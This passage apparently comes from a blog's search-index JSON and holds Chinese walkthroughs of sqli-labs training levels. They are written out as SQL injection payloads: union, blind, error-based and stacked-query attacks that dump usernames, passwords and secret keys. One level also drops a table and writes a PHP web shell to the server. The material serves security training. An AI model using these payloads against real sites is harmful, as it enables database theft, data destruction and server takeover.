123知道当前数据库是security之后查看数据库下的表uname&#x3D;&#39; or (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1)) &#x3D; 101)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit当输入&#x3D;101时返回蓝色，说明正确 12我们尝试一下输入其他的ascii码看一下是否能返回红色这里我们将ascii码改为了100，页面返回红色，说明错误，证明sql语句无误 12345按照之前列举库名一样，我们得出第一个表名为emails测试第四个表名看一下uname&#x3D;&#39; or (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,1)) &#x3D; 117)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit这里将limit改为3，因为limit是从0开始如果查看第四个改成3页面返回正确，117对应的是u，以此类推，返回结果是users表 123查看usres表下的字段uname&#x3D;&#39; or (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1)) &#x3D; 117)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit我们查询了第二个字段ascii是117对应的u，类推之后返回 username 1234查看username字段下的数据uname&#x3D;&#39; or (select ascii(substr((select username from users limit 1,1),1,1)) &#x3D; 65)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit使用burp抓包自动筛选，65对应的是A，因为limit是1所以查看的是第二个数据 1登录数据库查看第二个数据是否为A，第二个数据开头为A说明正确","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十二关POST联合","slug":"sqli-labs关卡/sqli-labs第十二关POST联合","date":"2020-07-25T01:18:02.616Z","updated":"2020-03-17T07:57:33.384Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十二关POST联合/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/","excerpt":"","text":"POST注入 1234查看当前报错信息输入万能的单引号时候发现页面返回正确，我们输入双引号试试1“页面报错，后面还有一个括号， 123上面报错，双引号后面还有一个括号，加上括号试试1&quot;)#页面返回正常 123查看当前当前字段数1&quot;) order by 2#之前测过3会报错，不再演示，输入2时返回正确 123知道当前字段数之后查看注入点1&quot;) union select 1,2#注入点1,和2 123在2的位置查看当前数据库1&quot;) union select 1,database()#当前数据库是security 123知道当前数据库了来查询表名1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;#获取到当前的表 123查看users表中字段1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#获取到一下字段 123查看一下username和password1&quot;) union select 1,group_concat(username,password) from users#成功地获取到了用户和密码","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十九关POST报错referer位置","slug":"sqli-labs关卡/sqli-labs第十九关POST报错referer位置","date":"2020-07-25T01:18:02.614Z","updated":"2020-03-19T00:17:25.276Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十九关POST报错referer位置/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3POST%E6%8A%A5%E9%94%99referer%E4%BD%8D%E7%BD%AE/","excerpt":"","text":"在登录时候进行抓包，当POST包发送到repeater模块单后运行一下，页面回显成功，字体返回蓝色字体，表示登录成功了 123可以看到 小蓝色字体里面有一个referer，可以推断是 referer位置注入，尝试一下查看当前库名1&#39; or updatexml(1,concat(0x7e,(database())),1),&#39;&#39;)#在referer位置输入SQL注入后，页面返回成功， 123查看表名1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &#39;security&#39; limit 0,1)),1),&#39;&#39;)#页面成功返回第一个表信息 12查看第一个表的第一行字段1&#39; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;emails&#39; limit 0,1)),1),&#39;&#39;)# 12查看id的 第一个数据1&#39; or updatexml(1,concat(0x7e,(select id from emails limit 0,1)),1),&#39;&#39;)#","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十三关POST报错","slug":"sqli-labs关卡/sqli-labs第十三关POST报错","date":"2020-07-25T01:18:02.612Z","updated":"2020-03-17T08:31:42.462Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十三关POST报错/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/","excerpt":"","text":"123测试报错信息1&#39;出现报错信息，后面还有有一个括号 123加上括号再加上注释符尝试一下1&#39;)#页面回显正常，说明可以进行注入 123获取字段数1&#39;) order by 2 #之前测试过了，这里的字段是是2，页面回显正常说明正确 123测试注入点1&#39;) union select 1,2#发现没有回显，这里我们想到之前提示过错误信息，但现在没有回显，可以使用报错注入尝试一下 123使用报错注入查看当前数据库1&#39;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)#成功地返回了当前数据库是security 123知道数据库之后查看security的表1&#39;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),0x7e),1)#这里使用了limit因为报错注入只能显示一行，如果不适用limit会报错，这里我们查看了第四个表名，limit 3,1因为limit是从0开始数的所以第四个表名要用3 1234查看users表的字段1&#39;) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 2,1),0x7e),1)#这里需要将库和表名都加上，不然会到其他的库找users内的字段，而不是在当前库我们这里将limit改成2查看第三个字段，第三个字段返回password，查看一下 123查看一下password字段1&#39;) and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#成功地返回信息，如果要继续查看更改limit的值就可以","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十七关POST报错password处","slug":"sqli-labs关卡/sqli-labs第十七关POST报错password处","date":"2020-07-25T01:18:02.610Z","updated":"2020-03-18T07:16:50.745Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十七关POST报错password处/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/","excerpt":"","text":"查看源码，这是最重要的两条，发现使用了check_input对uname输入的内容进行了过滤，但是他只过滤了uname，却没有过滤passwd，所以我们可以在passwd的位置记性sql注入 12345因为知道passwd的位置没有过滤，我们在他的位置输入万能的单引号 ‘ 查看一下是否会有报错信息uname&#x3D;admin&amp;passwd&#x3D;1&#39; &amp;submit&#x3D;Submit成功地返回了报错信息，仔细查看错误信息发现admin最后又两个单引号，所以需要用注释符注释一下uname&#x3D;admin&amp;passwd&#x3D;1&#39; #&amp;submit&#x3D;Submit页面返回正常，说明存在注入点，可以注入 123查询当前数据库，因为只有报错的时候显示没其他的时候只会返回成功与不成功，所以使用报错注入uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;submit&#x3D;Submit成功返回当前数据库信息，当前数据库是security 1234知道数据库了查询一下security下的表名uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) #&amp;submit&#x3D;Submit因为报错注入只能显示一行，所以需要加上limi来一行一行显示这里成功地返回了第一个表名，如果要查询其他的表名，更改limit的值就可以 1234我们以emails表为例查询表下的字段uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;emails&#39; limit 1,1),0x7e),1) #&amp;submit&#x3D;Submit这里查询的是第二个字段，将limit改为了1，limit是从0开始所以改为1页面成功返回 123知道了email_id字段，查询下该字段的数据uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select email_id from emails limit 0,1),0x7e),1) #&amp;submit&#x3D;Submit页面成功返回第一个数据 12进去mysql查看email_id表中的第一个数据是否是Dumb@dhakkan.com页面返回正确","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十一关POST联合","slug":"sqli-labs关卡/sqli-labs第十一关POST联合","date":"2020-07-25T01:18:02.607Z","updated":"2020-03-17T07:30:27.395Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十一关POST联合/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/","excerpt":"","text":"POST注入，POST注入经常用于登录框 这是初始界面 12先用万能的单引号看一下能否出来报错信息，密码随便输入，什么都行发现报错了，然后使用注释符注释一下看看能否返回正常，如果返回正常说明存在POST注入点 1页面返回成功没有报错，说明当前是单引号闭合，存在注入点， 1按照union 注入的方式查看一下当前字段数，发现居然报错了，字段数并不是3， 1查看一下2试试，发现字段2返回正常说明POST这里当前字段是2 123知道字段数了，查看一下注入点1&#39; union select 1,2 #页面返回了1和2这两个注入点，我们在2的位置查看一下当前数据库 123查看一下当前数据库1&#39; union select 1,database() #当前数据库是security 123知道数据库了，查看一下当前数据库下的表名1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; #发现有emails,referers,uagents,users这四个表，大部分用户信息都在users表中，查看一下users表 123查看一下users表中是否我有我想要的用户信息字段1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #其中users表中这么多字段，发现有id，username,password，我们查看一下这三个字段的用户信息 123查看id，username，password这三个字段1&#39; union select 1,group_concat(id,username,password) from users #成功地返回了用户信息","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第六十四关时间次数限制","slug":"sqli-labs关卡/sqli-labs第六十四关时间次数限制","date":"2020-07-25T01:18:02.606Z","updated":"2020-03-27T02:53:32.732Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第六十四关时间次数限制/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%9B%9B%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第六十关报错次数限制","slug":"sqli-labs关卡/sqli-labs第六十关报错次数限制","date":"2020-07-25T01:18:02.604Z","updated":"2020-03-26T17:19:35.510Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第六十关报错次数限制/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/","excerpt":"","text":"查看网页 查看源码，红线处将id进行了双引号和括号的包裹 页面中使用双引号引号和括号，注释符，页面返回正常 使用union查看注入点，页面并没有回显说明不能使用union注入 使用报错注入来查看当前数据库 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-60&#x2F;?id&#x3D;-1&quot;) and updatexml(1,concat(0x7e,(database())),1) --+ 查看表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-60&#x2F;?id&#x3D;-1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39;)),1) --+ 查看字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-60&#x2F;?id&#x3D;-1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;challenges&#39; and table_name&#x3D;&#39;jg6ofd34t5&#39;)),1) --+ 查看secret_01ME数据 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-60&#x2F;?id&#x3D;-1&quot;) and updatexml(1,concat(0x7e,(select group_concat(secret_01ME)from jg6ofd34t5)),1) --+ 提交数据，恭喜你成功了","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第六十二关时间次数限制","slug":"sqli-labs关卡/sqli-labs第六十二关时间次数限制","date":"2020-07-25T01:18:02.602Z","updated":"2020-03-27T02:42:21.517Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第六十二关时间次数限制/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/","excerpt":"","text":"查看原始页面，给了数据库CHALLENGES 查看源码，被单引号和括号 页面中加入单引号括号和注释符，页面返回正常 查看表名 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-62&#x2F;?id&#x3D;1&#39;) and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;CHALLENGES&#39; limit 0,1),1,1))&#x3D;105 --+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第六十三关时间次数限制","slug":"sqli-labs关卡/sqli-labs第六十三关时间次数限制","date":"2020-07-25T01:18:02.599Z","updated":"2020-03-27T02:47:21.808Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第六十三关时间次数限制/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第六十一关报错次数限制","slug":"sqli-labs关卡/sqli-labs第六十一关报错次数限制","date":"2020-07-25T01:18:02.597Z","updated":"2020-03-27T01:41:30.249Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第六十一关报错次数限制/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/","excerpt":"","text":"查看初始页面 显示输入id，输入id之后查看页面，页面返回正常 使用单引号查看闭合信息，发现单引号后面还有两个括号 加上括号和注释符，查看页面返回信息，返回信息成功 查看字段数字段数等于4的时候页面返回错误 查看字段3，页面返回正确， 使用union查看注入点，返现union不能返回注入点了，所以不能使用union 使用报错注入，查看当前数据库，页面返回challenges 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-61&#x2F;?id&#x3D;-1&#39;)) and updatexml(1,concat(0x7e,(database())),1) --+ 查看challenges库中的表，页面返回tq0w5yzn5n表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-61&#x2F;?id&#x3D;-1&#39;)) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39;)),1) --+ 查看tq0w5yzn5n表中的字段，页面返回id,sessid,secret_UEMR,tryy四个字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-61&#x2F;?id&#x3D;-1&#39;)) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;challenges&#39; and table_name&#x3D;&#39;tq0w5yzn5n&#39;)),1) --+ 查看secret_UEMR字段下的数据，返回2kpfwBoYzHpnIGhLSrnfYIvk数据 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-61&#x2F;?id&#x3D;-1&#39;)) and updatexml(1,concat(0x7e,(select group_concat(secret_UEMR)from tq0w5yzn5n)),1) --+ 将该数据提交，页面返回 恭喜你成功了","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第六关GET盲注","slug":"sqli-labs关卡/sqli-labs第六关GET盲注","date":"2020-07-25T01:18:02.595Z","updated":"2020-03-16T08:44:22.237Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第六关GET盲注/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"12先测试他的报错信息，这里我们使用单引号页面返回正常信息you are in，我们在尝试使用双引号发现页面报错，说明存在注入点http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; 12因为页面不返回内容，只有you are in和不显示这两个，所以不能使用union注入，这里需要使用布尔盲注，所以先要查看当前数据库长度，因为加上双引号了所以后面要跟注释符，使用布尔注入的时候不用能使union和group_concat只能用select， 123这里我们查看一下数据库长度http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and length(database())&#x3D;8--+输入8返回you are in 表示正确， 1在尝试一下9，页面没有回显，表示错误，可以确定当前数据库长度为8，然后查看当前数据库名称 1234查看当前数据库名称http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr(database(),1,1))&#x3D;115--+我们这里使用ascii码来查询，发现115返回you are in 其他不回显，说明115正确，115对应的ascii是s依次测试，最后得出结果是security 1234当知道当前数据库是security之后，测试当前库下表http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101--+当前测试ascii码为101对应的是e，然后向后测试得出第一个表为emails，更改limit查询其他表referers、uagents、users 123users表是我们想要的，我们查看users表中的字段http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105--+返回正确，105ascii对应的是i，经过测试第一个字段为id，第二个为password，第三个为username 123我们来查看一下password里的第一个数据，后面的数据以此类推http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select password from users limit 0,1),1,1))&#x3D;68--+68对应的ascii是大写D我们查看一下数据库是不是，发现确实是大写D开头说明正确","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第八关GET盲注","slug":"sqli-labs关卡/sqli-labs第八关GET盲注","date":"2020-07-25T01:18:02.593Z","updated":"2020-03-16T08:45:03.076Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第八关GET盲注/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"123确定当前字符长度。http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8--+我们发现字符长度为8的时候返回you are in 表示长度为8 12查看当前库名，使用sacii码，发现115返回you are in 其他编码不显示，115ascii编码对应的是s经过向后测试，测出库名为security。http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1))&#x3D;115--+ 12我们再来查看当前表名我们查询了第一个表发现ascii是101，101对应的ascii是e相同步骤更改,1,1的第一个数据向后测试，测试出的结果第一个表名是emali，测试第二个表名时更改limit 0,1的第一个数字0，以此类推 1234我们测试出了表名，发现有emails、referers、uagents、users，其中users就是我们想要的我们来查看users里面有什么字段http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105--+我们看到ascii码为105是返回正常，105对应的ascii是i然后经过测试这个字段是id，其他字段是password，username 123我们来查看表数据http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+我们查看了当前id的第一个字母对应的ascii是49，49对应的字母是1，以此类推，可以查看出其他的字段数据","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十四关次数限制_union","slug":"sqli-labs关卡/sqli-labs第五十四关次数限制_union","date":"2020-07-25T01:18:02.592Z","updated":"2020-03-26T10:45:48.455Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十四关次数限制_union/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/","excerpt":"","text":"提交security_key值查看原始页面，红线处为数据库名称 查看源码$id有单引号包裹 在页面中使用单引号将 id值进行包裹，并加上注释符，页面返回成功，红线处为只有10次运行机会，需要在10次内完成挑战 查看数据库字段数，order by 4的时候页面不显示，3的时候页面返回正常，说明当前字段数据为3 查看数据库注入点，注入点为2,3 在2,3任意位置进行注入，获取了表名jgdv6lzlmt 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-54&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;CHALLENGES&#39; --+ 查看字段，取security就行 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-54&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;jgdv6lzlmt&#39; --+ 查看secret_LXO3字段中的数据， 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-54&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(secret_LXO3)from jgdv6lzlmt --+ 成功获得了Secret_Key值，将这个值进行提交","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十关报错_时间_一句话_堆叠","slug":"sqli-labs关卡/sqli-labs第五十关报错_时间_一句话_堆叠","date":"2020-07-25T01:18:02.590Z","updated":"2020-03-26T02:36:03.711Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十关报错_时间_一句话_堆叠/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/","excerpt":"","text":"使用堆叠注入插入和删除表。 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 ; create table admin like users; --+页面返回正常 查看mysql，插入成功 删除admin表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 ; drop table admin ; --+ 使用报错注入1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 and updatexml(1,concat(0x7e,(database())),1) --+ 查看表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),1) --+ 查看字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;)),1) --+ 插入一句话木马1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1; select &#39;&lt;?php @eval($_POST[admin])?&gt;&#39; into outfile &#39;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\one.php&#39; --+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十六关次数限制union","slug":"sqli-labs关卡/sqli-labs第五十六关次数限制union","date":"2020-07-25T01:18:02.587Z","updated":"2020-03-26T15:52:45.409Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十六关次数限制union/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/","excerpt":"","text":"查看初始界面，提供了CHALLENGES这个数据库 查看源码，红线处发现id被单引号和括号包裹 页面中加入单引号和括号注释符进行查看，页面返回正常，说明语句成功 使用order by查看当前字段数，order by等于4的时候页面返回错误 查看order by 3，页面返回正常 使用union select 查看注入点，注入点为2,3 因为初始页面已经给了数据库，并不需要查询，直接查看表名即可 也可以查看一下，返回值和初始页面给的一样 查看表，获得gttnz12m3x表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-56&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39; --+ 查看表中字段，或者id,sessid,secret_MAMF,tryy四个字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-56&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;gttnz12m3x&#39; --+ 查看secret_MAMF字段中的数据，获取到了zFouSyjZX3ckJiJRNf95p8yf数据 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-56&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(secret_MAMF)from gttnz12m3x --+ 将zFouSyjZX3ckJiJRNf95p8yf数据提交 页面返回，congrats you nailed it，表示恭喜你成功了","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十八关报错次数限制","slug":"sqli-labs关卡/sqli-labs第五十八关报错次数限制","date":"2020-07-25T01:18:02.584Z","updated":"2020-03-26T16:58:46.663Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十八关报错次数限制/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/","excerpt":"","text":"查看源码，闭合为单引号，在页面尝试之后使用union select发现不回显注入点，说明不能使用union注入，使用报错注入 使用报错注入查看当前数据库，成功返回challenges 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-58&#x2F;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(database())),1) --+ 查看表，成功回显， 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-58&#x2F;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39;)),1) --+ 查看字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-58&#x2F;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;challenges&#39; and table_name&#x3D;&#39;4ba1mlox34&#39;)),1) --+ 查看secret_E8N2字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-58&#x2F;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_E8N2)from 4ba1mlox34)),1) --+ 提交数据，成功","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十五关次数限制Union","slug":"sqli-labs关卡/sqli-labs第五十五关次数限制Union","date":"2020-07-25T01:18:02.572Z","updated":"2020-03-26T13:37:53.672Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十五关次数限制Union/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/","excerpt":"","text":"查看初始页面，其中CHALLENGES是数据库的名字 按照要求加上ID，查看页面，限制14次页面运行 查看源代码，id被括号包裹 加上括号和注释符，查看页面，页面成功返回正常 使用order by 查看字段数，字段数4的时候页面返回异常 查看字段数3，字段数3页面返回正常 查看注入点，注入点2,3 查看表名，页面成功返回表ibmeah9iie 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-55&#x2F;?id&#x3D;-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;CHALLENGES&#39; --+ 查看字段页面成功返回字段数 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-55&#x2F;?id&#x3D;-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;ibmeah9iie&#39; --+ 查看secret_ZMCY字段中的数据，页面成功返回dDRLwbDflII7XMtZFPiLMVzJ 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-55&#x2F;?id&#x3D;-1) union select 1,2,group_concat(secret_ZMCY)from ibmeah9iie --+ 将内容复制到secret_Key对话框提交 